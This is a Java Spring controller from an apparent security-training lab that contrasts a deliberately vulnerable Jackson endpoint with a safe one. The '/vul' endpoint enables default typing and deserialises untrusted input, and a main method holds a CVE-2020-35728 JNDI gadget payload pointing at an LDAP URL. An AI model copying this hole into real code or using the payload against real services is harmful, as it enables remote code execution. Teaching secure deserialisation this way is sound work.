package top.whgojp.modules.components.jackson.controller;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.context.MessageSource;
import org.springframework.context.i18n.LocaleContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @description 组件漏洞-Jackson
 * @author: whgojp
 * @email: whgojp@foxmail.com
 * @Date: 2024/8/12 22:50
 */
@Slf4j
@Api(value = "JacksonController", tags = "组件漏洞-Jackson")
@Controller
@CrossOrigin(origins = "*")
@RequestMapping("/jackson")
public class JacksonController {
    private final MessageSource messageSource;

    public JacksonController(MessageSource messageSource) {
        this.messageSource = messageSource;
    }

    @RequestMapping("")
    public String jackson() {
        return "vul/components/jackson";
    }

    @RequestMapping("/vul")
    @ResponseBody
    public String vul(@RequestBody(required = false) String content) {
        try {
            if (content == null || content.trim().isEmpty()) {
                content = "[\"java.util.HashMap\",{\"name\":\"JavaSecLab\"}]";
            }
            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping(); // 启用多态类型处理

            // 反序列化接收的JSON数据，触发漏洞
            Object obj = mapper.readValue(content, Object.class);
            return msg("component.jackson.result.vul", obj);
        } catch (Exception e) {
            e.printStackTrace();
            return msg("component.jackson.result.failed");
        }
    }


    @RequestMapping("/safe")
    @ResponseBody
    public String safeJackson(@RequestBody(required = false) String payload) {
        try {
            if (payload == null || payload.trim().isEmpty()) {
                payload = "{\"name\":\"JavaSecLab\"}";
            }
            ObjectMapper mapper = new ObjectMapper();
            mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

            // 不启用DefaultTyping，仅解析为普通Map结构。
            Map<String, Object> safePayload = mapper.readValue(payload, new TypeReference<LinkedHashMap<String, Object>>() {});
            return mapper.writeValueAsString(safePayload);
        } catch (Exception e) {
            e.printStackTrace();
            return msg("component.jackson.result.safeFailed");
        }
    }

    private String msg(String key, Object... args) {
        return messageSource.getMessage(key, args, LocaleContextHolder.getLocale());
    }


    /**
     * CVE-2020-35728
     * com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化
     */
    public static void main(String[] args) throws Exception {
        String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/zrnug1\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }

}
